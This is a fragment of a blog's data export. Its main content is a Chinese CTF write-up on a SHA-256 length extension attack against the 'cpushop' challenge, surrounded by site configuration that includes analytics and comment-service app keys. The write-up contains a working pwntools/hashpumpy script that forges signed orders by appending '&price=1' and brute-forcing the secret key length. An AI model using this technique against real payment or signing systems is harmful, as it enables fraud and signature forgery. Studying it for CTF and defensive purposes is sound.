class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">88</span>&amp;price=<span class=\"hljs-number\">1</span>&amp;sign=b<span class=\"hljs-number\">842</span>b<span class=\"hljs-number\">4</span>baa<span class=\"hljs-number\">0</span>d<span class=\"hljs-number\">4405697</span>b<span class=\"hljs-number\">740</span>a<span class=\"hljs-number\">871</span>ae<span class=\"hljs-number\">60</span>dd<span class=\"hljs-number\">64617</span>cdfa<span class=\"hljs-number\">1846132373e1</span>b<span class=\"hljs-number\">3</span>a<span class=\"hljs-number\">371</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">0</span>db<span class=\"hljs-number\">3</span></code></pre></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<h3 id=\"哈希长度拓展攻击学习\"><a href=\"#哈希长度拓展攻击学习\" class=\"headerlink\" title=\"哈希长度拓展攻击学习\"></a>哈希长度拓展攻击学习</h3><p>参考资料：<a href=\"哈希长度扩展攻击的简介以及HashPump安装使用方法\">哈希长度扩展攻击的简介以及HashPump安装使用方法</a><br>","more":"</p>\n<h4 id=\"关于哈希长度拓展\"><a href=\"#关于哈希长度拓展\" class=\"headerlink\" title=\"关于哈希长度拓展\"></a>关于哈希长度拓展</h4><p>&emsp;&emsp;一开始我也是没有想法<del>甚至打算爆破的</del>，后来在师姐的指引下看了谋篇博客（见参考资料），就和师姐一起做出来了，写篇博客记录下。题目文件已上传到百度云,链接: <a href=\"https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/13d0Re1b_IIez-11dowmvtQ</a> 密码: f1t2</p>\n<h5 id=\"大概解题思路\"><a href=\"#大概解题思路\" class=\"headerlink\" title=\"大概解题思路\"></a>大概解题思路</h5><p>&emsp;&emsp;解释一下题目，linux下<code>nc cpushop.2018.teamrois.cn 43000</code>有四个选项，列出菜单，下订单，支付，退出，flag也在菜单里面，然后就是不择手段买到flag<br>&emsp;&emsp;但是我们的钱是<code>money = random.randint(1000, 10000)</code>这么来的flag价格是99999，也就是说正常方法我们是无论如何也买不到flag的,然而它检查price的方法用了for循环。。。<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">for</span> k,v <span class=\"hljs-keyword\">in</span> parse_qsl(payment):\n    <span class=\"hljs-keyword\">if</span> k == <span class=\"hljs-string\">'product'</span>:\n        product = v\n    <span class=\"hljs-keyword\">elif</span> k == <span class=\"hljs-string\">'price'</span>:\n        <span class=\"hljs-keyword\">try</span>:\n            price = int(v)\n        <span class=\"hljs-keyword\">except</span> ValueError:\n            <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'Invalid Order!'</span>\n            <span class=\"hljs-keyword\">return</span></code></pre></p>\n<p>简而言之就是它会一直检查订单里的价格，比方说，你的订单是长介样子的<code>product=xxx&amp;price=99999&amp;price=1</code>上面代码出来的最终结果是price=1<br>signkey是一个8到32位的str<br><pre><code class=\"hljs python\">signkey = <span class=\"hljs-string\">''</span>.join([random.choice(string.letters+string.digits) <span class=\"hljs-keyword\">for</span> _ <span class=\"hljs-keyword\">in</span> xrange(random.randint(<span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">32</span>))])</code></pre></p>\n<p>order的格式<br><pre><code class=\"hljs python\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">order</span><span class=\"hljs-params\">()</span>:</span>\n    n = input_int(<span class=\"hljs-string\">'Product ID: '</span>)\n    <span class=\"hljs-keyword\">if</span> n &lt; <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">or</span> n &gt;= len(items):\n        <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'Invalid ID!'</span>\n        <span class=\"hljs-keyword\">return</span>\n    payment = <span class=\"hljs-string\">'product=%s&amp;price=%d&amp;timestamp=%d'</span> % (items[n][<span class=\"hljs-number\">0</span>], items[n][<span class=\"hljs-number\">1</span>], time.time()*<span class=\"hljs-number\">1000000</span>)\n    sign = sha256(signkey+payment).hexdigest()\n    payment += <span class=\"hljs-string\">'&amp;sign=%s'</span> % sign\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'Your order:\\n%s\\n'</span> % payment</code></pre></p>\n<h5 id=\"长度拓展攻击\"><a href=\"#长度拓展攻击\" class=\"headerlink\" title=\"长度拓展攻击\"></a>长度拓展攻击</h5><p>假设<br>密文A：xxxxx<br>明文B：ABCD<br>&emsp;&emsp;你知道(<code>密文A+明文B</code>)的哈希值和B，因为A我们不知道，爆破会比较困难，通过哈希长度拓展攻击可以修改B的内容<br>假设我们的带的订单内容如下<br><pre><code class=\"hljs undefined\">product=Flag<span class=\"hljs-variable\">&amp;price</span>=<span class=\"hljs-number\">99999</span><span class=\"hljs-variable\">&amp;timestamp</span>=<span class=\"hljs-number\">1526903707553295</span><span class=\"hljs-variable\">&amp;sign</span>=<span class=\"hljs-number\">9226</span>bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4</code></pre></p>\n<p>那么<br>明文B：<code>product=Flag&amp;price=99999&amp;timestamp=1526903707553295</code><br>sha256(密文A+明文B)：<code>9226bf4f86d5b02042281d87b1b104048c2da41f395350b6f68b05c5addc6fe4</code><br>如果我们可以把订单的明文添加一个&amp;price=1进去，那么pay的过程它经过for循环后最终价格会变化才能1，那么我们的目的就达到了<br>最终的一键代码如下，需要安装两个库文件<br><pre><code class=\"hljs undefined\">pip <span class=\"hljs-keyword\">install</span> pwntools\npip <span class=\"hljs-keyword\">install</span> hashpumpy</code></pre></p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-keyword\">from</span> hashpumpy <span class=\"hljs-keyword\">import</span> hashpump\n<span class=\"hljs-keyword\">import</span> time\nnc = remote(<span class=\"hljs-string\">\"cpushop.2018.teamrois.cn\"</span>,<span class=\"hljs-number\">43000</span>)\ntxt = nc.recvuntil(<span class=\"hljs-string\">'Command:'</span>)\n<span class=\"hljs-keyword\">print</span> txt\nnc.send(<span class=\"hljs-string\">'2'</span>)\n<span class=\"hljs-keyword\">print</span> nc.recvuntil(<span class=\"hljs-string\">'ID:'</span>)\nnc.send(<span class=\"hljs-string\">'9'</span>)\ncode = nc.recvuntil(<span class=\"hljs-string\">'Command:'</span>)\n<span class=\"hljs-keyword\">print</span> code\nflag = code[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">134</span>]\nhexdata = flag[<span class=\"hljs-number\">57</span>:]\noriginal = flag[<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">51</span>]\nadd = <span class=\"hljs-string\">'&amp;price=1'</span>\ndic = []\n<span class=\"hljs-keyword\">print</span> original\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">33</span>):\n    a,b = hashpump(hexdata,original,add,i)\n    order = b + <span class=\"hljs-string\">'&amp;sign='</span> + a\n    nc.send(<span class=\"hljs-string\">'3'</span>)\n    <span class=\"hljs-keyword\">print</span> nc.recvuntil(<span class=\"hljs-string\">'order:'</span>)\n    <span class=\"hljs-keyword\">print</span> i\n    <span class=\"hljs-keyword\">print</span> order\n    nc.send(order)\n    <span class=\"hljs-keyword\">print</span> nc.recvuntil(<span class=\"hljs-string\">'Command:'</span>)\nnc.interactive()</code></pre>\n<p>tip:<code>hexdata</code>是A+B的哈希，<code>original</code>是B，<code>add</code>是要加的内容，<code>i</code>是A的长度。<br><strong>爆破A很困难，爆破A的长度就很简单了</strong><br>最后构造出来的订单式长这样子<br><pre><code class=\"hljs undefined\">product=Flag&amp;price=<span class=\"hljs-number\">99999</span>&amp;timestamp=<span class=\"hljs-number\">1526818398651000</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">80</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">00</span>\\<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">88</span>&amp;price=<span class=\"hljs-number\">1</span>&amp;sign=b<span class=\"hljs-number\">842</span>b<span class=\"hljs-number\">4</span>baa<span class=\"hljs-number\">0</span>d<span class=\"hljs-number\">4405697</span>b<span class=\"hljs-number\">740</span>a<span class=\"hljs-number\">871</span>ae<span class=\"hljs-number\">60</span>dd<span class=\"hljs-number\">64617</span>cdfa<span class=\"hljs-number\">1846132373e1</span>b<span class=\"hljs-number\">3</span>a<span class=\"hljs-number\">371</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">0</span>db<span class=\"hljs-number\">3</span></code></pre></p>"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ckffbhovn0000ez8kufwwke8g","tag_id":"ckffbhowm0004ez8ksardp5mn","_id":"ckffbhoxh000lez8kijpww5g9"},{"post_id":"ckffbhovn0000ez8kufwwke8g","tag_id":"ckffbhox0000aez8kwok6nw72","_id":"ckffbhoxi000nez8kcbn2k901"},{"post_id":"ckffbhovn0000ez8kufwwke8g","tag_id":"ckffbhox7000dez8kdm41ndeo","_id":"ckffbhoxk000qez8k1hb8pkv9"},{"post_id":"ckffbhovn0000ez8kufwwke8g","tag_id":"ckffbhoxb000gez8ki2ale646","_id":"ckffbhoxo000sez8kh21ij7pd"},{"post_id":"ckffbhowd0002ez8ktz6ghsj6","tag_id":"ckffbhoxf000jez8k48d753qd","_id":"ckffbhoy30012ez8kvxkipsu4"},{"post_id":"ckffbhowd0002ez8ktz6ghsj6","tag_id":"ckffbhoxk000pez8kcafts4sy","_id":"ckffbhoy50014ez8k2bmt6oix"},{"post_id":"ckffbhowd0002ez8ktz6ghsj6","tag_id":"ckffbhoxp000uez8kj33c9m56","_id":"ckffbhoy60016ez8kuyfnqox0"},{"post_id":"ckffbhowd0002ez8ktz6ghsj6","tag_id":"ckffbhoxu000xez8k0v3mlzg7","_id":"ckffbhoy60017ez8k35r2akey"},{"post_id":"ckffbhowp0005ez8kopssnh57","tag_id":"ckffbhoy10010ez8kqjhga78v","_id":"ckffbhoy7001aez8knudbk9ox"},{"post_id":"ckffbhowp0005ez8kopssnh57","tag_id":"ckffbhoy50015ez8k9i8ff21v","_id":"ckffbhoy7001bez8kgbubo1j6"},{"post_id":"ckffbhowp0005ez8kopssnh57","tag_id":"ckffbhoy60018ez8kamocws4n","_id":"ckffbhoy7001dez8kiq9fvtmq"},{"post_id":"ckffbhowt0007ez8kxz17hh6x","tag_id":"ckffbhoy70019ez8kl81l5ro7","_id":"ckffbhoy8001fez8kef988pzc"},{"post_id":"ckffbhowt0007ez8kxz17hh6x","tag_id":"ckffbhoy7001cez8kj6c9au4u","_id":"ckffbhoy8001gez8krazgp463"},{"post_id":"ckffbhowy0009ez8kf4emt20g","tag_id":"ckffbhoy8001eez8kijnmikx0","_id":"ckffbhoyc001kez8kv1qct2cg"},{"post_id":"ckffbhowy0009ez8kf4emt20g","tag_id":"ckffbhoy8001hez8k2wfdi8u2","_id":"ckffbhoyc001lez8k0v1zfi0w"},{"post_id":"ckffbhowy0009ez8kf4emt20g","tag_id":"ckffbhoy8001iez8k56h9hml3","_id":"ckffbhoyc001nez8kpls10rve"},{"post_id":"ckffbhox3000bez8kl403zm4k","tag_id":"ckffbhowm0004ez8ksardp5mn","_id":"ckffbhoye001qez8kv7m22jzr"},{"post_id":"ckffbhox3000bez8kl403zm4k","tag_id":"ckffbhoy50015ez8k9i8ff21v","_id":"ckffbhoye001rez8kov1p89du"},{"post_id":"ckffbhox3000bez8kl403zm4k","tag_id":"ckffbhoyc001mez8kmhx4jddr","_id":"ckffbhoyf001tez8km94h5mtl"},{"post_id":"ckffbhox3000bez8kl403zm4k","tag_id":"ckffbhox7000dez8kdm41ndeo","_id":"ckffbhoyf001uez8kaosozp2x"},{"post_id":"ckffbhox5000cez8kn41pznf9","tag_id":"ckffbhoy10010ez8kqjhga78v","_id":"ckffbhoyh001xez8kgrnt9xav"},{"post_id":"ckffbhox5000cez8kn41pznf9","tag_id":"ckffbhoy50015ez8k9i8ff21v","_id":"ckffbhoyh001yez8kpaxs0f8t"},{"post_id":"ckffbhox5000cez8kn41pznf9","tag_id":"ckffbhoy60018ez8kamocws4n","_id":"ckffbhoyi0020ez8kib0zohqr"},{"post_id":"ckffbhox7000eez8kus3awsn2","tag_id":"ckffbhoy10010ez8kqjhga78v","_id":"ckffbhoyk0023ez8kxdw0gs5g"},{"post_id":"ckffbhox7000eez8kus3awsn2","tag_id":"ckffbhoy50015ez8k9i8ff21v","_id":"ckffbhoyl0024ez8k4y7omh2w"},{"post_id":"ckffbhox7000eez8kus3awsn2","tag_id":"ckffbhoy60018ez8kamocws4n","_id":"ckffbhoyl0026ez8k2dj4j0xc"},{"post_id":"ckffbhox9000fez8ko65pui15","tag_id":"ckffbhowm0004ez8ksardp5mn","_id":"ckffbhoym0028ez8k78pq18zj"},{"post_id":"ckffbhox9000fez8ko65pui15","tag_id":"ckffbhox7000dez8kdm41ndeo","_id":"ckffbhoym0029ez8k0gzrw1xb"},{"post_id":"ckffbhox9000fez8ko65pui15","tag_id":"ckffbhoy50015ez8k9i8ff21v","_id":"ckffbhoyn002bez8kwp9m42dw"},{"post_id":"ckffbhox9000fez8ko65pui15","tag_id":"ckffbhoyl0025ez8kqy5vcd5o","_id":"ckffbhoyn002cez8k7wqxeiou"},{"post_id":"ckffbhoxc000hez8k80sqcdrb","tag_id":"ckffbhoyl0027ez8k7dmdj88a","_id":"ckffbhoyp002fez8kisy49j5n"},{"post_id":"ckffbhoxc000hez8k80sqcdrb","tag_id":"ckffbhoym002aez8k9anh40zt","_id":"ckffbhoyq002gez8kkavy13vf"},{"post_id":"ckffbhoxc000hez8k80sqcdrb","tag_id":"ckffbhoyn002dez8kq79c8oyh","_id":"ckffbhoyq002iez8kone0xs3m"},{"post_id":"ckffbhoxd000iez8kmxthbkjk","tag_id":"ckffbhowm0004ez8ksardp5mn","_id":"ckffbhoys002lez8kkq8u9jdm"},{"post_id":"ckffbhoxd000iez8kmxthbkjk","tag_id":"ckffbhox7000dez8kdm41ndeo","_id":"ckffbhoys002mez8k0i39q4j2"},{"post_id":"ckffbhoxd000iez8kmxthbkjk","tag_id":"ckffbhoyp002eez8kucjauntj","_id":"ckffbhoyt002oez8kc8gcp4of"},{"post_id":"ckffbhoxd000iez8kmxthbkjk","tag_id":"ckffbhoyq002hez8k4rvb7l3s","_id":"ckffbhoyt002pez8ko2rsu0ki"},{"post_id":"ckffbhoxd000iez8kmxthbkjk","tag_id":"ckffbhoyr002jez8khl3i9oih","_id":"ckffbhoyt002rez8kkg5r8exd"},{"post_id":"ckffbhoxf000kez8kpqb7tygc","tag_id":"ckffbhoyr002kez8kgwaorb2e","_id":"ckffbhoyu002sez8kghgdyyt0"},{"post_id":"ckffbhoxj000oez8kib1grmh7","tag_id":"ckffbhowm0004ez8ksardp5mn","_id":"ckffbhoyu002uez8kz7noigw3"},{"post_id":"ckffbhoxj000oez8kib1grmh7","tag_id":"ckffbhox7000dez8kdm41ndeo","_id":"ckffbhoyu002vez8kshglg23m"},{"post_id":"ckffbhoxj000oez8kib1grmh7","tag_id":"ckffbhoy50015ez8k9i8ff21v","_id":"ckffbhoyv002xez8kmfvu6rva"},{"post_id":"ckffbhoxj000oez8kib1grmh7","tag_id":"ckffbhoyc001mez8kmhx4jddr","_id":"ckffbhoyv002yez8komedz39g"},{"post_id":"ckffbhoxk000rez8kwsn7c8cq","tag_id":"ckffbhowm0004ez8ksardp5mn","_id":"ckffbhoyy0033ez8kuye0hkea"},{"post_id":"ckffbhoxk000rez8kwsn7c8cq","tag_id":"ckffbhox7000dez8kdm41ndeo","_id":"ckffbhoyy0034ez8kqyzyn0wy"},{"post_id":"ckffbhoxk000rez8kwsn7c8cq","tag_id":"ckffbhoyu002tez8kyyyspb6z","_id":"ckffbhoyy0036ez8kp8kqnjei"},{"post_id":"ckffbhoxk000rez8kwsn7c8cq","tag_id":"ckffbhoy50015ez8k9i8ff21v","_id":"ckffbhoyz0037ez8kkcm4ov3q"},{"post_id":"ckffbhoxk000rez8kwsn7c8cq","tag_id":"ckffbhoyc001mez8kmhx4jddr","_id":"ckffbhoyz0039ez8kp45g2beu"},{"post_id":"ckffbhoxk000rez8kwsn7c8cq","tag_id":"ckffbhoyq002hez8k4rvb7l3s","_id":"ckffbhoyz003aez8khdslnqo5"},{"post_id":"ckffbhoxk000rez8kwsn7c8cq","tag_id":"ckffbhoyx0031ez8klftt24s2","_id":"ckffbhoz1003cez8kxgupqs4j"},{"post_id":"ckffbhoxo000tez8k1zbxn5g7","tag_id":"ckffbhowm0004ez8ksardp5mn","_id":"ckffbhoz1003dez8k84rkwefc"},{"post_id":"ckffbhoxo000tez8k1zbxn5g7","tag_id":"ckffbhoy50015ez8k9i8ff21v","_id":"ckffbhoz1003fez8kh0dz64u4"},{"post_id":"ckffbhoxo000tez8k1zbxn5g7","tag_id":"ckffbhoy10010ez8kqjhga78v","_id":"ckffbhoz1003gez8kmvvgav1c"},{"post_id":"ckffbhoxq000vez8kb70bavnn","tag_id":"ckffbhoyz0038ez8kvm290afd","_id":"ckffbhoz2003iez8k4rlc7zzm"},{"post_id":"ckffbhoxq000vez8kb70bavnn","tag_id":"ckffbhoyz003bez8kit3pgodd","_id":"ckffbhoz2003jez8knf4bq7kj"},{"post_id":"ckffbhoxs000wez8kbwpouvrj","tag_id":"ckffbhoy50015ez8k9i8ff21v","_id":"ckffbhoz3003lez8kb4r8y5rx"},{"post_id":"ckffbhoxs000wez8kbwpouvrj","tag_id":"ckffbhox7000dez8kdm41ndeo","_id":"ckffbhoz3003mez8ksl7pepxp"},{"post_id":"ckffbhoxs000wez8kbwpouvrj","tag_id":"ckffbhoz2003hez8k1y4k45l9","_id":"ckffbhoz3003oez8kawthtm4i"},{"post_id":"ckffbhoxu000yez8k3csit8zi","tag_id":"ckffbhoz2003kez8k1